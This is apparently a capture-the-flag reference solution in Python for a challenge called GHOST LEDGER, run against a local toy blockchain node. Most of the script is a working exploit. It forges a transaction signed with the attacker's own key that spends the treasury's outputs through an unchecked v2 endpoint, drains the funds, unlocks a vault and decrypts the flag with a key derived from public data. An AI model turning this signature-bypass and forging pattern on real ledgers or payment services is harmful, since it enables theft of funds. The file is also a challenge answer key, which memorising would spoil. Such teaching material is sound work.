#!/usr/bin/env python3
"""
GHOST LEDGER — reference solution (Python)

Independent implementation of the SGK address/transaction encoding — does
NOT call into @sgk/core. This exists to prove the wire format is actually
documented and reproducible, not something only the reference JS client
happens to produce correctly.

Steps: recon -> forge (sign with our own key, spend the treasury's UTXOs) ->
submit to /api/tx/v2 -> wait for confirmation -> sign an ownership proof ->
unlock the vault -> derive the AES key from public chain state -> decrypt.

Requires: pip install requests cryptography
"""

import hashlib
import json
import os
import time

import requests
from cryptography.hazmat.primitives.asymmetric.ed25519 import (
    Ed25519PrivateKey,
)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

NODE_URL = os.environ.get("GL_NODE_URL", "http://localhost:8600")

BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"


def double_sha256(data: bytes) -> bytes:
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()


def base58_encode(data: bytes) -> str:
    n = int.from_bytes(data, "big")
    out = ""
    while n > 0:
        n, rem = divmod(n, 58)
        out = BASE58_ALPHABET[rem] + out
    leading_zeros = len(data) - len(data.lstrip(b"\x00"))
    return BASE58_ALPHABET[0] * leading_zeros + out


def encode_address(public_key: bytes, network: str = "testnet") -> str:
    network_byte = {"mainnet": 0x1F, "testnet": 0x6F, "devnet": 0x8F}[network]
    pubkey_hash = double_sha256(public_key)[:20]
    payload = bytes([network_byte]) + pubkey_hash
    checksum = double_sha256(payload)[:4]
    return base58_encode(payload + checksum)


def canonical_output(o: dict) -> dict:
    # amounts travel as decimal strings, exactly like JS's bigint.toString()
    return {"amount": str(o["amount"]), "address": o["address"]}


def serialize_for_signing(inputs: list, outputs: list, version: int, lock_time: int) -> bytes:
    payload = {
        "version": version,
        "inputs": [
            {"prevTxId": i["prevTxId"], "outputIndex": i["outputIndex"], "publicKey": i["publicKey"]}
            for i in inputs
        ],
        "outputs": [canonical_output(o) for o in outputs],
        "lockTime": lock_time,
    }
    # compact separators to match JS's default JSON.stringify (no spaces)
    return json.dumps(payload, separators=(",", ":")).encode("utf-8")


def serialize_full(inputs: list, outputs: list, version: int, lock_time: int) -> bytes:
    payload = {
        "version": version,
        "inputs": [
            {
                "prevTxId": i["prevTxId"],
                "outputIndex": i["outputIndex"],
                "publicKey": i["publicKey"],
                "signature": i["signature"],
            }
            for i in inputs
        ],
        "outputs": [canonical_output(o) for o in outputs],
        "lockTime": lock_time,
    }
    return json.dumps(payload, separators=(",", ":")).encode("utf-8")


def build_transaction(inputs_to_spend, outputs, private_key: Ed25519PrivateKey, public_key_hex: str,
                       version=1, lock_time=0) -> dict:
    unsigned_inputs = [
        {"prevTxId": u["txId"], "outputIndex": u["outputIndex"], "publicKey": public_key_hex}
        for u in inputs_to_spend
    ]
    message = serialize_for_signing(unsigned_inputs, outputs, version, lock_time)
    signature = private_key.sign(message).hex()
    signed_inputs = [{**i, "signature": signature} for i in unsigned_inputs]
    return {"version": version, "inputs": signed_inputs, "outputs": outputs, "lockTime": lock_time}


def main():
    print("[*] Recon...")
    info = requests.get(f"{NODE_URL}/api/blockchain/info").json()
    briefing = requests.get(f"{NODE_URL}/api/briefing").json()
    genesis_hash = info["genesisHash"]
    treasury_address = briefing["treasuryAddress"]
    treasury_amount = int(briefing["treasuryAmount"])
    print(f"    genesisHash      = {genesis_hash}")
    print(f"    treasuryAddress  = {treasury_address}")
    print(f"    treasuryAmount   = {treasury_amount}")

    treasury_info = requests.get(f"{NODE_URL}/api/address/{treasury_address}").json()
    print(f"[*] Treasury UTXOs: {len(treasury_info['utxos'])}")

    print("[*] Generating our own keypair (we do NOT have the treasury's private key)...")
    attacker_priv = Ed25519PrivateKey.generate()
    attacker_pub = attacker_priv.public_key().public_bytes_raw()
    attacker_pub_hex = attacker_pub.hex()
    attacker_address = encode_address(attacker_pub, "testnet")
    print(f"    our address = {attacker_address}")

    print("[*] Forging a transaction: sign with OUR key, reference the TREASURY's UTXOs...")
    inputs_to_spend = [{"txId": u["txId"], "outputIndex": u["outputIndex"]} for u in treasury_info["utxos"]]
    outputs = [{"amount": treasury_amount, "address": attacker_address}]
    tx = build_transaction(inputs_to_spend, outputs, attacker_priv, attacker_pub_hex)

    print("[*] Submitting to /api/tx/v2 (the leaked fast path)...")
    resp = requests.post(f"{NODE_URL}/api/tx/v2", json=tx)
    if not resp.ok:
        raise SystemExit(f"v2 submit failed: {resp.text}")
    tx_id = resp.json()["txId"]
    print(f"    accepted: txId {tx_id}")

    print("[*] Waiting for the sweep to be mined...")
    balance = 0
    for _ in range(30):
        time.sleep(2)
        addr_info = requests.get(f"{NODE_URL}/api/address/{attacker_address}").json()
        balance = int(addr_info["balance"])
        print(f"\r    balance: {balance}   ", end="", flush=True)
        if balance >= treasury_amount:
            break
    print()
    if balance < treasury_amount:
        raise SystemExit("sweep did not confirm in time")
    print("[+] Treasury fully drained into our address.")

    print("[*] Proving ownership of our address (signed challenge) and unlocking the vault...")
    challenge = f"unlock-vault:{attacker_address}".encode("utf-8")
    ownership_sig = attacker_priv.sign(challenge).hex()

    vault_resp = requests.post(
        f"{NODE_URL}/api/vault/unlock",
        json={"address": attacker_address, "publicKey": attacker_pub_hex, "signature": ownership_sig},
    )
    if not vault_resp.ok:
        raise SystemExit(f"vault unlock failed: {vault_resp.text}")
    ciphertext_hex = vault_resp.json()["ciphertext"]
    print(f"    ciphertext: {ciphertext_hex[:32]}...")

    print("[*] Deriving AES key = SHA256(genesisHash + treasuryAddress) and decrypting...")
    key = hashlib.sha256((genesis_hash + treasury_address).encode("utf-8")).digest()
    blob = bytes.fromhex(ciphertext_hex)
    iv, auth_tag, ciphertext = blob[:12], blob[12:28], blob[28:]

    flag = AESGCM(key).decrypt(iv, ciphertext + auth_tag, None).decode("utf-8")

    print("\n=================================")
    print(f"FLAG: {flag}")
    print("=================================")


if __name__ == "__main__":
    main()
